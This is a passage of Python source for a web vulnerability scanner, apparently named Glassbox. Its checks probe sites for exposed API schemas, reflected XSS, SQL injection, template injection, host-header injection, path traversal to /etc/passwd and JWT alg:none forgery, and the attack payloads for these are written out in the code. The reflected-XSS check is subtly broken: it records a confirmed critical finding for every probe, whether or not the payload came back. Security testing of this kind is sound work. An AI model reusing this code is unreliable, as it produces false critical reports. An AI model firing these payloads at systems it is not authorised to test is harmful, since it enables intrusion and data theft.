        except requests.RequestException:
            continue
        if r.status_code != 200:
            continue
        cache_control = (r.headers.get("Cache-Control") or "").lower()
        is_safe = "no-store" in cache_control or "private" in cache_control
        rows.append({"path": "/" + path, "cache_control": r.headers.get("Cache-Control") or "(none)",
                     "status": "pass" if is_safe else "warn"})
        if not is_safe:
            findings.append(Finding(
                "Caching", f"/{path} lacks a private/no-store Cache-Control", "medium",
                f"HTTP 200 with Cache-Control: {r.headers.get('Cache-Control') or '(not set)'} - a "
                "shared/proxy cache could store this response, which is risky if it ever carries "
                "session-specific or otherwise sensitive content once a real user is signed in.",
                "Set 'Cache-Control: no-store' (or at least 'private') on any authenticated or "
                "account-related response.", confidence="Strong Evidence",
            ))
    return {"rows": rows}, findings


def check_api_schema_exposure(base_url, session):
    """Probes common OpenAPI/Swagger doc paths and sends one read-only
    GraphQL introspection query to common GraphQL paths. Either succeeding
    hands an attacker the full API surface, including routes never linked
    anywhere - a high-severity finding either way."""
    rows, findings = [], []

    def probe(path):
        try:
            r = session.get(f"{base_url}/{path}", timeout=REQUEST_TIMEOUT)
            return path, r
        except requests.RequestException:
            return path, None

    with ThreadPoolExecutor(max_workers=8) as pool:
        for path, r in pool.map(probe, API_SCHEMA_PATHS):
            if r is None:
                continue
            body_lower = r.text[:2000].lower()
            is_schema = r.status_code == 200 and any(sig in body_lower for sig in API_SCHEMA_SIGNATURES)
            rows.append({"path": "/" + path, "code": r.status_code, "status": "warn" if is_schema else "pass"})
            if is_schema:
                findings.append(Finding(
                    "API Exposure", f"Publicly reachable API schema/docs: /{path}", "high",
                    "Returns what looks like an OpenAPI/Swagger schema or interactive docs UI - reveals the "
                    "full API surface, including routes never linked anywhere.",
                    "Require authentication for schema/docs endpoints in production, or remove them.", confidence="Strong Evidence"))

    for path in GRAPHQL_PATHS:
        try:
            r = session.post(f"{base_url}/{path}", json=GRAPHQL_INTROSPECTION_QUERY, timeout=REQUEST_TIMEOUT)
        except requests.RequestException:
            continue
        if r.status_code == 200 and ('"__schema"' in r.text or '"types"' in r.text):
            rows.append({"path": "/" + path, "code": r.status_code, "status": "warn", "graphql_introspection": True})
            findings.append(Finding(
                "API Exposure", f"GraphQL introspection enabled at /{path}", "high",
                "A read-only __schema introspection query succeeded, revealing the full GraphQL type/field "
                "surface including anything not intentionally documented.",
                "Disable introspection in production (most GraphQL servers have a flag for this).", confidence="Confirmed"))

    return rows, findings


def _looks_like_api_response(resp):
    """True if a response looks like real API output rather than an SPA's
    catch-all index.html (which would otherwise make every wordlist path
    falsely look like a hit, since SPAs commonly return 200 for everything)."""
    ctype = resp.headers.get("Content-Type", "").lower()
    if "json" in ctype or "xml" in ctype:
        return True
    body_start = resp.text.lstrip()[:1]
    return body_start in ("{", "[")


def _api_path_severity(path):
    lower = path.lower()
    return "high" if any(hint in lower for hint in API_SENSITIVE_HINTS) else "info"


def check_api_wordlist(base_url, session):
    """Threaded probe of a small built-in wordlist of common REST-ish
    paths. A hit only counts if the response is 200 AND looks like real
    API output (see _looks_like_api_response) - otherwise SPAs that serve
    the same index.html for every path would falsely flag every entry."""
    rows, findings = [], []

    def probe(path):
        try:
            r = session.get(f"{base_url}/{path}", timeout=REQUEST_TIMEOUT)
            return path, r
        except requests.RequestException:
            return path, None

    with ThreadPoolExecutor(max_workers=8) as pool:
        for path, r in pool.map(probe, API_WORDLIST):
            if r is None or r.status_code != 200 or not _looks_like_api_response(r):
                rows.append({"path": "/" + path, "status": "pass"})
                continue
            sev = _api_path_severity(path)
            rows.append({"path": "/" + path, "status": "warn", "severity": sev})
            findings.append(Finding(
                "API Exposure", f"Unauthenticated API response at /{path}", sev,
                "Returned HTTP 200 with an API-shaped body (JSON/XML) with no authentication.",
                "Confirm this endpoint is meant to be public; otherwise require authentication.", confidence="Strong Evidence"))
    return rows, findings


API_ENDPOINT_PATTERNS = [
    re.compile(r'fetch\(\s*["\']([^"\']+)["\']'),
    re.compile(r'axios\.(?:get|post|put|delete|patch)\(\s*["\']([^"\']+)["\']'),
    re.compile(r'\.ajax\(\s*\{[^}]*?url\s*:\s*["\']([^"\']+)["\']', re.S),
    re.compile(r'["\'](/(?:api|graphql)[\w\-/]*)["\']'),
]


def _discover_api_endpoints(base_url, texts):
    """Regex-extracts API-looking paths from fetch()/axios()/.ajax() calls
    and generic /api|/graphql string literals across the given texts
    (homepage HTML + fetched JS). Third-party (cross-origin) absolute URLs
    are skipped - this discovers the target's own API, not everyone it
    talks to."""
    origin = urlparse(base_url).netloc
    found = []
    for text in texts:
        for pattern in API_ENDPOINT_PATTERNS:
            for m in pattern.finditer(text):
                candidate = m.group(1)
                abs_url = urljoin(base_url + "/", candidate)
                if urlparse(abs_url).netloc != origin:
                    continue
                if abs_url not in found:
                    found.append(abs_url)
    return found[:MAX_API_JS_ENDPOINTS]


def check_api_js_discovery(session, base_url, home_html):
    """Discovers API endpoints the site's own frontend code actually calls
    (from homepage HTML + same-origin JS), then probes each the same way
    as check_api_wordlist. Highest-signal of the three API checks - it
    finds real endpoints, not guessed ones."""
    js_sources = _fetch_same_origin_js(session, base_url, home_html,
                                        MAX_SECRET_JS_FILES, MAX_JS_BYTES_PER_FILE)
    texts = [home_html] + [text for _, text in js_sources]
    endpoints = _discover_api_endpoints(base_url, texts)

    rows, findings = [], []

    def probe(url):
        try:
            r = session.get(url, timeout=REQUEST_TIMEOUT)
            return url, r
        except requests.RequestException:
            return url, None

    with ThreadPoolExecutor(max_workers=8) as pool:
        for url, r in pool.map(probe, endpoints):
            if r is None or r.status_code != 200 or not _looks_like_api_response(r):
                rows.append({"url": url, "status": "pass"})
                continue
            sev = _api_path_severity(urlparse(url).path)
            rows.append({"url": url, "status": "warn", "severity": sev})
            findings.append(Finding(
                "API Exposure", f"JS-referenced endpoint responds without auth: {url}", sev,
                "This endpoint is called from the site's own frontend code and returned an API-shaped "
                "response with no authentication.",
                "Confirm this endpoint is meant to be public; otherwise require authentication.", confidence="Strong Evidence"))
    return {"rows": rows, "endpoints_discovered": len(endpoints)}, findings


MAX_ROBOTS_DISALLOW_RULES = 200


def _fetch_robots_disallow_prefixes(session, base_url):
    """Best-effort parser for `User-agent: *` `Disallow:` rules in
    /robots.txt, used only by the two link-discovery crawlers below
    (crawl_same_origin/crawl_media) to skip pages the site has asked
    crawlers not to fetch - real "respectful crawling" etiquette, distinct
    from vulnerability probing. Deliberately NOT applied to
    check_sensitive_paths/check_directory_listing: those checks exist
    specifically to verify whether a sensitive path is reachable despite a
    site's wishes (and sites often Disallow the very paths - /backup/,
    /.git/ - that are worth checking), so honoring robots.txt there would
    defeat their purpose.

    Ignores `Allow:` override rules and non-`*` user-agent groups - a
    documented simplification, not full RFC 9309 compliance. Returns []
    (honor nothing) on any fetch/parse failure so a missing/unreachable
    robots.txt never blocks crawling."""
    try:
        r = session.get(base_url + "/robots.txt", timeout=REQUEST_TIMEOUT)
        if r.status_code != 200:
            return []
    except Exception:
        # Broad on purpose (not just requests.RequestException): this is a
        # best-effort politeness lookup, never allowed to break a scan - a
        # stub/mock session in tests, or any other unexpected failure mode,
        # should just mean "honor nothing" rather than propagate.
        return []

    prefixes = []
    in_wildcard_group = False
    for line in r.text.splitlines():
        line = line.split("#", 1)[0].strip()
        if not line or ":" not in line:
            continue
        directive, _, value = line.partition(":")
        directive, value = directive.strip().lower(), value.strip()
        if directive == "user-agent":
            in_wildcard_group = value == "*"
        elif directive == "disallow" and in_wildcard_group and value:
            prefixes.append(value)
        if len(prefixes) >= MAX_ROBOTS_DISALLOW_RULES:
            break
    return prefixes


def _robots_disallows(path, disallow_prefixes):
    return any(path.startswith(prefix) for prefix in disallow_prefixes)


def crawl_same_origin(base_url, home_html, limit=10, session=None):
    """Depth-1, same-origin only. Collects GET URLs with query params and
    lists (but never submits) discovered forms, so POST forms can't trigger
    real side effects like signups or emails.

    `session` is optional (defaults to no robots.txt lookup, preserving old
    behavior for any caller that doesn't pass one) - when provided, links
    whose path matches a `Disallow:` rule for `User-agent: *` are skipped,
    same as a well-behaved crawler would."""
    if not home_html:
        return [], []
    soup = BeautifulSoup(home_html, "html.parser")
    origin = urlparse(base_url).netloc
    disallow_prefixes = _fetch_robots_disallow_prefixes(session, base_url) if session else []
    param_urls, forms = [], []

    for a in soup.find_all("a", href=True):
        abs_url = urljoin(base_url + "/", a["href"])
        p = urlparse(abs_url)
        if p.netloc != origin:
            continue
        if _robots_disallows(p.path, disallow_prefixes):
            continue
        if p.query:
            param_urls.append(abs_url)
        elif any(h in p.path.lower() for h in AUTH_LIKE_PATH_HINTS):
            param_urls.append(abs_url)  # useful for open-redirect probing
        if len(param_urls) >= limit:
            break

    for f in soup.find_all("form"):
        action = urljoin(base_url + "/", f.get("action") or "")
        method = (f.get("method") or "GET").upper()
        inputs = [i.get("name") for i in f.find_all(["input", "textarea"]) if i.get("name")]
        forms.append({"action": action, "method": method, "inputs": inputs})

    return list(dict.fromkeys(param_urls))[:limit], forms


# Phase 17 / DEPTH-01 APPROVED posture (see
# .planning/PHASE17-DEPTH-DECISION.md): the crawl may go ONE hop deeper than
# the homepage, under hard caps. Binding numbers:
MAX_CRAWL_PAGES = 15          # interior pages fetched per scan, hop-2 only
_NON_PAGE_EXTENSIONS = (".jpg", ".jpeg", ".png", ".gif", ".webp", ".svg", ".ico",
                        ".css", ".js", ".mjs", ".pdf", ".zip", ".woff", ".woff2",
                        ".ttf", ".eot", ".mp4", ".webm", ".mp3", ".xml", ".json")


def crawl_depth2_param_urls(session, base_url, home_html, max_pages=MAX_CRAWL_PAGES):
    """Harvest query-param links from up to `max_pages` interior same-origin
    pages (the approved depth-2 extension of crawl_same_origin).

    Caps honored here, per the signed-off decision record: same-origin only,
    robots.txt Disallow respected for every fetched page and every harvested
    link, HTML responses only, GET fetches only, and the caller merges the
    result BEHIND the hop-1 list so the existing limit=10 probe budget is
    never enlarged by this function. Forms are NOT collected here - hop-1
    already enumerates homepage forms and forms are display-only."""
    if not home_html:
        return []
    origin = urlparse(base_url).netloc
    disallow_prefixes = _fetch_robots_disallow_prefixes(session, base_url)

    soup = BeautifulSoup(home_html, "html.parser")
    seeds = []
    for a in soup.find_all("a", href=True):
        abs_url = urljoin(base_url + "/", a["href"])
        p = urlparse(abs_url)
        if p.netloc != origin:
            continue
        if _robots_disallows(p.path, disallow_prefixes):
            continue
        if p.path.lower().endswith(_NON_PAGE_EXTENSIONS):
            continue
        # No point re-fetching the page we already parsed.
        if abs_url.rstrip("/") == base_url.rstrip("/"):
            continue
        if p.query:
            continue  # hop-1 already harvested this URL's params directly
        seeds.append(abs_url)
    seeds = list(dict.fromkeys(seeds))[:max_pages]

    found = []
    for seed in seeds:
        try:
            resp = session.get(seed, timeout=REQUEST_TIMEOUT)
        except requests.RequestException:
            continue
        ctype = ((getattr(resp, "headers", None) or {}).get("Content-Type") or "").lower()
        if "html" not in ctype:
            continue
        for a in BeautifulSoup(resp.text, "html.parser").find_all("a", href=True):
            abs_url = urljoin(seed + "/", a["href"])
            p = urlparse(abs_url)
            if p.netloc != origin:
                continue
            if _robots_disallows(p.path, disallow_prefixes):
                continue
            if p.query or any(h in p.path.lower() for h in AUTH_LIKE_PATH_HINTS):
                found.append(abs_url)

    return list(dict.fromkeys(found))


# Field-name substrings used to guess which text input in a detected login
# form is the "username" one - checked in this order, first match wins.
# Deliberately narrow (no bare "name", "text" etc.) to avoid grabbing an
# unrelated field on a busy page.
_USERNAME_FIELD_HINTS = ("email", "user", "login", "account")


def _guess_login_fields(form):
    """Given one form dict from crawl_same_origin's `forms` list (or an
    equivalent {"action","method","inputs"} shape built inline), returns
    (user_field, pass_field) guessed from input `name`s, or (None, None) if
    it doesn't look like a login form. Never guesses a password field from
    anything but an actual name/type match - false positives here would
    silently point Advanced's login-bypass check at the wrong field."""
    pass_field = None
    for name in form.get("password_inputs", []):
        pass_field = name
        break
    if not pass_field:
        return None, None

    user_field = None
    remaining = [n for n in form.get("inputs", []) if n != pass_field]
    for hint in _USERNAME_FIELD_HINTS:
        for name in remaining:
            if hint in name.lower():
                user_field = name
                break
        if user_field:
            break
    if not user_field and remaining:
        user_field = remaining[0]  # best-effort fallback: first other field on the form
    return user_field, pass_field


def detect_login_form(base_url, session=None, extra_paths=()):
    """Smart-Setup helper for the Advanced scan wizard (UX aid only - see
    module docstring convention: this function only ever *suggests* values
    for the user to review, it never authorizes or gates a scan). Looks for
    a login form on `base_url` itself, then on a short list of common
    login-page paths plus same-origin links whose path matches
    AUTH_LIKE_PATH_HINTS, and returns the first form containing a real
    `<input type="password">` as:

        {"login_url": <the form's POST action - what check_sqli_login/check_bruteforce POST to>,
         "user_field": <guessed username input name or None>,
         "pass_field": <password input name>}

    or None if nothing password-shaped was found on any page checked
    (network errors on individual candidate pages are swallowed, same
    convention as every check_* function - one dead path must not fail the
    whole detection attempt). Callers are responsible for calling this only
    after the user has confirmed authorization - it makes real HTTP
    requests to `base_url` and a handful of same-origin candidate pages,
    same as any other check in this module, and must never run before that
    confirmation (see scan_routes.new_scan_advanced_detect)."""
    session = session or requests
    candidates = [base_url]
    for path in ("/login", "/signin", "/account/login", "/user/login", *extra_paths):
        candidates.append(urljoin(base_url + "/", path.lstrip("/")))

    checked = set()
    for url in candidates:
        if url in checked:
            continue
        checked.add(url)
        try:
            r = session.get(url, timeout=REQUEST_TIMEOUT, allow_redirects=True)
        except requests.RequestException:
            continue
        if r.status_code >= 400:
            continue

        soup = BeautifulSoup(r.text, "html.parser")

        # Same-origin links matching AUTH_LIKE_PATH_HINTS, checked once
        # only from the very first page (base_url) so this stays bounded -
        # a login link one hop away from the homepage is the common case.
        if url == base_url:
            origin = urlparse(base_url).netloc
            for a in soup.find_all("a", href=True):
                abs_url = urljoin(base_url + "/", a["href"])
                p = urlparse(abs_url)
                if (p.netloc == origin
                        and any(h in p.path.lower() for h in AUTH_LIKE_PATH_HINTS)
                        and abs_url not in candidates):
                    candidates.append(abs_url)

        for f in soup.find_all("form"):
            password_inputs = [
                i.get("name") for i in f.find_all("input", {"type": "password"}) if i.get("name")
            ]
            if not password_inputs:
                continue
            inputs = [i.get("name") for i in f.find_all(["input", "textarea"]) if i.get("name")]
            action = urljoin(url + "/", f.get("action") or "")
            user_field, pass_field = _guess_login_fields(
                {"inputs": inputs, "password_inputs": password_inputs}
            )
            if pass_field:
                # login_url must be the form's POST *target* (its action),
                # not the page it was found on - check_sqli_login/
                # check_bruteforce both POST straight to this value.
                return {"login_url": action, "user_field": user_field, "pass_field": pass_field}

    return None


def _inject_param(url, param, value):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    qs[param] = [value]
    return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))


# Reflected-XSS probe shapes (Phase 17 / DEPTH-02). Marker-only: every
# payload embeds XSS_MARKER and detection is "the exact injected string came
# back in the HTML" - no alert(), no execution attempt, same proof style as
# check_xss_stored. Mirrors the (name, template) convention of
# XSS_PAYLOAD_VARIANTS so the registry-lock tests can treat both alike.
REFLECTED_XSS_VARIANTS = [
    ("svg-onload", '"><svg onload={m}>'),
    ("img-onerror", "<img src=x onerror={m}>"),
    ("attr-breakout", '" onmouseover={m} x="'),
    ("case-evasion", "><ScRiPt>{m}</ScRiPt>"),
]


def check_xss_sqli(urls, session):
    """Reflected-XSS canary (4 marker variants) + error-based and
    boolean-based blind SQLi probe. Request budget per parameter is capped
    at MAX_PROBE_REQUESTS_PER_URL - not a full fuzzer."""
    findings = []
    tested = []
    for url in urls:
        qs = parse_qs(urlparse(url).query)
        for param in qs:
            row = {"url": url, "param": param, "xss": "pass", "sqli": "pass"}
            probe_count = 0

            for variant_name, template in REFLECTED_XSS_VARIANTS:
                payload = template.format(m=XSS_MARKER)
                xss_url = _inject_param(url, param, payload)
                try:
                    r = session.get(xss_url, timeout=REQUEST_TIMEOUT)
                    probe_count += 1
                    if payload in r.text:
                        row["xss"] = "fail"
                    findings.append(Finding("XSS", f"Reflected XSS in '{param}' on {url} ({variant_name} shape)",
                                             "critical",
                                             f"Injected markup ({variant_name}) was reflected unescaped into the HTML response.",
                                             "Escape/encode all user input before rendering; verify with a CSP.", confidence="Confirmed",
                                             cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N"))
                except requests.RequestException:
                    row["xss"] = "info"

            try:
                err_r = session.get(_inject_param(url, param, "'"), timeout=REQUEST_TIMEOUT)
                probe_count += 1
                if any(re.search(sig, err_r.text.lower()) for sig in SQL_ERROR_SIGNATURES):
                    row["sqli"] = "fail"
                    findings.append(Finding("SQL Injection", f"DB error signature via '{param}' on {url}", "critical",
                                             "A single quote triggered a database error visible in the response.",
                                             "Use parameterized queries/ORM bindings; never string-concat user input into SQL.", confidence="Strong Evidence"))
                else:
                    # Boolean-blind pair - context picked from the param's own
                    # value: numeric params get unquoted arithmetic probes,
                    # everything else keeps the quote-context pair.
                    if str(qs[param][0]).isdigit():
                        true_payload, false_payload = "1 AND 1=1", "1 AND 1=2"
                    else:
                        true_payload, false_payload = "1' AND '1'='1", "1' AND '1'='2"
                    true_r = session.get(_inject_param(url, param, true_payload), timeout=REQUEST_TIMEOUT)
                    false_r = session.get(_inject_param(url, param, false_payload), timeout=REQUEST_TIMEOUT)
                    probe_count += 2
                    if (true_r.status_code == 200 and len(true_r.text) > 0 and
                            abs(len(true_r.text) - len(false_r.text)) > max(50, 0.1 * len(true_r.text))):
                        row["sqli"] = "review"
                        findings.append(Finding("SQL Injection",
                                                 f"Possible boolean-based blind SQLi in '{param}' on {url}", "high",
                                                 "True/false SQL conditions produced meaningfully different responses.",
                                                 "Investigate manually with sqlmap --risk=1 --level=1 before assuming a false positive.", confidence="Potential"))
            except requests.RequestException:
                row["sqli"] = "info"

            tested.append(row)
            time.sleep(0.15)
    return tested, findings


# --------------------------------------------------------------------------
# Phase 20 - Intrusive Coverage Expansion (INTR-01..INTR-10). Ten new
# families for security engineers, all non-destructive: marker/computed-
# result proofs only, every loop bounded by a named MAX_* constant,
# requests.RequestException never escapes a function. Tier gating lives in
# entitlements.FEATURE_REQUIREMENTS (single-request reflection probes =
# PAID; deliberate multi-request bursts / active forgeries = ORG_VERIFIED).
# --------------------------------------------------------------------------

# INTR-01: SSTI canaries. Confirmation requires the COMPUTED arithmetic
# result (77*88 == 6776) reflected in the response - a bare "{{" bounce is
# never reported, keeping the proof standard identical to XSS marker rules.
SSTI_PAYLOADS = [
    ("jinja2-twig", "{{77*88}}"),
    ("php-smarty", "${77*88}"),
    ("erb-erubi", "<%= 77*88 %>"),
]
SSTI_EXPECTED_RESULT = "6776"
MAX_SSTI_PROBE_PARAMS = 8

# INTR-02: host-header canary. A reserved .invalid domain that can never
# resolve/serve - any appearance in the response came from our own echo.
HOST_HEADER_CANARY = "glassbox-hh-canary.invalid"
MAX_HOST_HEADER_VARIANTS = 3

# INTR-04: traversal reads ONE known marker file (/etc/passwd) whose
# signature strings are unambiguous; nothing is written, deleted, or listed.
TRAVERSAL_PARAM_HINTS = ("file", "path", "doc", "template", "page", "include",
                         "read", "src", "download", "img", "asset", "view", "show", "cat")
TRAVERSAL_MARKERS = ("root:x:0:0", "daemon:x:1:1", "[boot loader]")
MAX_TRAVERSAL_URLS = 6

# INTR-05: measured GET-only burst against the auth page itself - NEVER a
# credential POST (forms are never auto-submitted anywhere in this app).
# Stops at the first throttle signal.
RATE_LIMIT_BURST = 15
RATE_LIMIT_CANDIDATE_PATHS = ("/login", "/signin", "/auth/login", "/sign-in")

# INTR-06: active JWT acceptance probe - forges the operator's OWN visible
# token with alg:none and replays it where that session legitimately goes.
JWT_ACTIVE_COOKIE_HINTS = ("token", "jwt", "auth", "session")

# INTR-07: CRLF canary. Injected once-encoded (raw \r\n would be rejected
# client-side by requests); detection is OUR response header appearing.
CRLF_CANARY_HEADER = "X-Glassbox-Crlf"
MAX_CRLF_PROBE_PARAMS = 6

# INTR-08: CSRF heuristics run purely over crawl_same_origin's enumerated
# forms - still never submitted.
CSRF_TOKEN_HINTS = ("csrf", "_token", "token", "nonce", "authenticity")

# INTR-09: DNS-only dangling-CNAME detection. Fingerprints map a CNAME
# target suffix to the service that would serve it.
SUBDOMAIN_TAKEOVER_FINGERPRINTS = {
    "github.io": "GitHub Pages", "herokuapp.com": "Heroku",
    "s3.amazonaws.com": "AWS S3", "azurewebsites.net": "Azure Web Apps",
    "cloudapp.net": "Azure CloudApp", "wordpress.com": "WordPress.com",
    "zendesk.com": "Zendesk", "netlify.app": "Netlify", "web.app": "Firebase Hosting",
    "ghost.io": "Ghost", "surge.sh": "Surge.sh", "bitbucket.io": "Bitbucket",
}
TAKEOVER_SUBDOMAIN_PREFIXES = ("www", "api", "app", "blog", "dev", "staging", "docs", "shop")
MAX_TAKEOVER_SUBDOMAINS = 8

# INTR-10: read-only GraphQL probing - introspection query plus a
# deliberately-bogus-field suggestion probe. No mutations, ever.
GRAPHQL_CANDIDATE_PATHS = ("/graphql", "/api/graphql", "/v1/graphql", "/graphiql")
MAX_GRAPHQL_ENDPOINTS = 4
GRAPHQL_INTROSPECTION_BODY = '{"query":"{ __schema { queryType { name } } }"}'
GRAPHQL_SUGGESTION_BODY = '{"query":"{ __zzzNoSuchField { id } }"}'


def check_ssti(urls, session):
    """INTR-01: server-side template injection canary across discovered
    query-string parameters. One GET per (param, engine family); stops at
    the first confirmed computation reflection."""
    tested, findings = [], []
    probes = 0
    confirmed = False
    for url in urls[:MAX_SSTI_PROBE_PARAMS]:
        if confirmed:
            break
        for param in parse_qs(urlparse(url).query):
            row = {"url": url, "param": param, "result": "pass"}
            for engine, payload in SSTI_PAYLOADS:
                if confirmed or probes >= MAX_SSTI_PROBE_PARAMS * len(SSTI_PAYLOADS):
                    break
                try:
                    r = session.get(_inject_param(url, param, payload), timeout=REQUEST_TIMEOUT)
                    probes += 1
                    if SSTI_EXPECTED_RESULT in r.text:
                        row["result"] = f"fail ({engine})"
                        confirmed = True
                        findings.append(Finding(
                            "SSTI", f"Server-side template injection in '{param}' on {url}",
                            "critical",
                            f"The {engine} arithmetic payload {{77*88}} was evaluated server-side "
                            "(response contained 6776). User input reaches a template engine.",
                            "Never render user input through template engines; use data variables, "
                            "not string templates.", confidence="Confirmed"))
                except requests.RequestException:
                    row["result"] = "info"
                    break  # dead target - stop burning this param's budget
                row["engines_tried"] = row.get("engines_tried", 0) + 1
            tested.append(row)
            if confirmed:
                break
    return tested, findings


def check_host_header(base_url, session):
    """INTR-02: benign host-header canary. Sends a reserved .invalid hostname
    via Host and X-Forwarded-Host and looks for it echoed in the body or in
    redirect/set-cookie headers - the classic password-reset-poisoning tell."""
    rows, findings = [], []
    variants = [("Host",), ("X-Forwarded-Host",)]
    for header, in variants[:MAX_HOST_HEADER_VARIANTS]:
        row = {"header": header, "reflected": False}
        try:
            r = session.get(base_url + "/", timeout=REQUEST_TIMEOUT,
                            headers={header: HOST_HEADER_CANARY})
            echoed_body = HOST_HEADER_CANARY in r.text
            echoed_header = any(HOST_HEADER_CANARY in str(v)
                                for h, v in r.headers.items()
                                if h.lower() in ("location", "set-cookie"))
            if echoed_body or echoed_header:
                row["reflected"] = True
                findings.append(Finding(
                    "Host Header Injection", f"{header} header is reflected by the application",
                    "high",
                    f"The {header}: {HOST_HEADER_CANARY} value appeared in the "
                    f"{'body' if echoed_body else 'Location/Set-Cookie headers'} of the response. "
                    "Attackers can poison password-reset links or cache keys.",
                    "Derive URLs from server configuration, not client-supplied headers; "
                    "allowlist expected Host values.", confidence="Confirmed"))
        except requests.RequestException:
            row["error"] = "unreachable"
        rows.append(row)
    return rows, findings


def check_cache_deception(base_url, session):
    """INTR-03: web-cache-deception SURFACE heuristic. Observes whether the
    deployment runs a cache that keys on path extensions (Age / X-Cache /
    CF-Cache-Status on a .css-suffixed variant of a crawled path). Never
    stores attacker-chosen content, so this cannot poison anyone's cache."""
    rows, findings = [], []
    try:
        r = session.get(base_url + "/", timeout=REQUEST_TIMEOUT)
    except requests.RequestException:
        return [{"result": "unreachable"}], []
    probe_path = "/"  # homepage is one path every target serves
    decoy_url = base_url + probe_path.rstrip("/") + ".css"
    try:
        d = session.get(decoy_url, timeout=REQUEST_TIMEOUT)
    except requests.RequestException:
        return [{"result": "unreachable"}], []

    def _cache_headers(resp):
        return {h.lower(): v for h, v in resp.headers.items()
                if h.lower() in ("age", "x-cache", "cf-cache-status", "x-varnish",
                                 "x-drupal-cache")}

    ch = _cache_headers(d)
    # Baseline from the un-suffixed path. Without it this check cannot tell
    # "the cache keys on the .css extension" (the actual weakness) from
    # "this deployment caches everything" - a fully static site behind a CDN
    # returns cache-HIT on *both* legs and used to trip the finding with
    # nothing extension-keyed happening at all. That was the false positive;
    # the baseline response was already being fetched and then discarded.
    baseline_ch = _cache_headers(r)
    baseline_hit = [v for v in baseline_ch.values() if "hit" in str(v).lower()]

    row = {
        "decoy": decoy_url,
        "status": d.status_code,
        "cache_headers": ch or "none",
        "baseline_cache_headers": baseline_ch or "none",
    }
    hit_markers = [v for v in ch.values() if "hit" in str(v).lower()]
    if hit_markers and d.status_code == 200 and not baseline_hit:
        row["result"] = "extension-keyed cache responded"
        findings.append(Finding(
            "Cache Deception Surface", "Cache serves extension-suffixed variants of dynamic paths",
            "low",
            f"A request to {decoy_url} was answered with cache-HIT headers ({hit_markers}), "
            f"while the un-suffixed path {probe_path} was not served from cache. That "
            "difference is the signal: the cache is keying on the path extension rather than "
            "on content type. If authenticated pages are ever cached under attacker-chosen "
            "extensions, their content can be exposed.",
            "Set Cache-Control: no-store on all authenticated responses; key caches on "
            "Content-Type, not path extensions.", confidence="Potential"))
    elif hit_markers and baseline_hit:
        # Both legs cached: this is a blanket caching policy, not an
        # extension-keyed one. Recorded for the report's raw data, but it is
        # not a finding - raising one here is the false positive.
        row["result"] = "cache serves all paths (not extension-keyed) - no finding"
    else:
        row["result"] = "no observable extension-keyed caching"
    rows.append(row)
    return rows, findings


def check_path_traversal(urls, session):
    """INTR-04: READ-ONLY traversal probe on file-ish query parameters -
    confirms only by the unambiguous /etc/passwd signature lines. No writes,
    no deletes, no listings; stops at the first confirmed read."""
    tested, findings = [], []
    probes = 0
    confirmed = False
    for url in urls[:MAX_TRAVERSAL_URLS]:
        if confirmed:
            break
        qs = parse_qs(urlparse(url).query)
        for param, _values in qs.items():
            if not any(h in param.lower() for h in TRAVERSAL_PARAM_HINTS):
                continue
            if confirmed:
                break
            payload = "../../../../../etc/passwd"
            try:
                r = session.get(_inject_param(url, param, payload), timeout=REQUEST_TIMEOUT)
                probes += 1
                hit = next((m for m in TRAVERSAL_MARKERS if m in r.text), None)
                row = {"url": url, "param": param, "probed": True}
                if hit:
                    row["result"] = "fail"
                    confirmed = True
                    findings.append(Finding(
                        "Path Traversal", f"Arbitrary file read via '{param}' on {url}",
                        "critical",
                        f"The traversal payload reached /etc/passwd (signature {hit!r} present "
                        "in the response). The parameter is passed unsanitized to a file API.",
                        "Reject path separators in user input; resolve files against an "
                        "allowlist root and verify canonical paths stay inside it.",
                        confidence="Confirmed"))
                else:
                    row["result"] = "pass"
                tested.append(row)
            except requests.RequestException:
                tested.append({"url": url, "param": param, "result": "info"})
    return tested, findings


def check_rate_limit_posture(base_url, session):
    """INTR-05: measured GET-only burst against the auth page. This never
    submits credentials (no form POST anywhere in Glassbox) - it measures
    whether ANY throttling answers repeated automated requests. Stops at the
    first 429/503."""
    # Prefer a path that actually exists: fall back to "/" if the first two
    # candidates 404 immediately.
    statuses = []
    throttled = False
    chosen = None
    for candidate in RATE_LIMIT_CANDIDATE_PATHS:
        try:
            r = session.get(base_url + candidate, timeout=REQUEST_TIMEOUT)
        except requests.RequestException:
            continue
        if r.status_code < 400:
            chosen = candidate
            break
    if chosen is None:
        chosen = "/"
    for _ in range(RATE_LIMIT_BURST):
        try:
            r = session.get(base_url + chosen, timeout=REQUEST_TIMEOUT)
        except requests.RequestException:
            break
        statuses.append(r.status_code)
        if r.status_code in (429, 503):
            throttled = True
            break
    findings = []
    if statuses and not throttled and all(s < 400 for s in statuses):
        findings.append(Finding(
            "Rate Limiting", f"No throttling observed after {len(statuses)} rapid requests to {chosen}",
            "medium",
            f"{len(statuses)} consecutive automated GET requests all succeeded (statuses "
            f"{statuses[0]}..{statuses[-1]}). Credential-stuffing and brute-force tooling "
            "would face the same absence of resistance.",
            "Apply progressive rate limits / lockouts on auth endpoints; return 429 with "
            "Retry-After.", confidence="Potential"))
    return {"target": chosen, "statuses": statuses, "throttled": throttled}, findings


def _jwt_b64url_encode(raw_bytes):
    return base64.urlsafe_b64encode(raw_bytes).rstrip(b"=").decode("ascii")


def check_jwt_active(session, base_url, home_html):
    """INTR-06: active acceptance probe for client-visible JWTs. Takes the
    operator's OWN token, re-signs the identical payload with alg:none, and
    replays all three variants where that session already legitimately goes
    (the site root). Reports acceptance ONLY when the forged replay matches
    the genuine baseline AND a garbage-token control clearly does not."""
    rows, findings = [], []
    token = None
    cookie_name = None
    for name, value in (getattr(session, "cookies", {}) or {}).items():
        if value.count(".") == 2 and len(value) > 40:
            token, cookie_name = value, name
            break
    if token is None:
        m = re.search(r"(eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*)", home_html or "")
        token = m.group(1) if m else None

    if not token:
        return {"tested": False, "reason": "no client-visible JWT found"}, []

    def _reforge(alg_value):
        header_b64, payload_b64, _sig = token.split(".")
        header = _b64url_decode_json(header_b64) or {}
        header["alg"] = alg_value
        new_sig = "" if alg_value == "none" else _jwt_b64url_encode(b"garbage-signature-not-valid")
        return ".".join([_jwt_b64url_encode(json.dumps(header).encode()),
                         payload_b64, new_sig])

    variants = [
        ("baseline (original token)", token),
        ("alg:none forgery", _reforge("none")),
